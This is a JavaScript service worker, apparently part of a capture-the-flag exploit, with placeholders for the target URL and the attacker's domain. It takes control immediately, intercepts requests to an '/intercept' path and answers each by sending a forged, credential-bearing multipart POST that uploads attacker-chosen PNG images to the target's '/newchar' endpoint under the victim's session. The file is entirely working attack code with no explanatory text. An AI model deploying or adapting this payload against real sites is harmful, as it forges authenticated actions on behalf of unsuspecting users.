self.skipWaiting(); // force take control
self.addEventListener('fetch', event => {
    const chalUrl = "TARGET_PLACEHOLDER";
    const ourDomain = "DOMAIN_PLACEHOLDER"
    const pngDict = {
        /* INSERT PNG DICT HERE */
    }
    if (event.request.url.slice(0, -2).endsWith('/intercept')) {
        const hexcode = event.request.url.slice(-2);
        const imageContents = pngDict[hexcode]; // base64 encoded image

        // https://stackoverflow.com/questions/16245767/creating-a-blob-from-a-base64-string-in-javascript yay
        const byteCharacters = atob(imageContents);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const imageBlob = new Blob([byteArray], {type: "image/png"});

        const data = new FormData();
        data.append("name", "a");
        data.append("occupation", "a");
        data.append("cursed_technique", "a");
        data.append("notes", "a");
        data.append("file", imageBlob, "a.png");
        event.respondWith(fetch(`${chalUrl}/newchar`, {
            method: 'POST',
            mode: 'no-cors',
            credentials: 'include',
            body: data
        }));
    }
});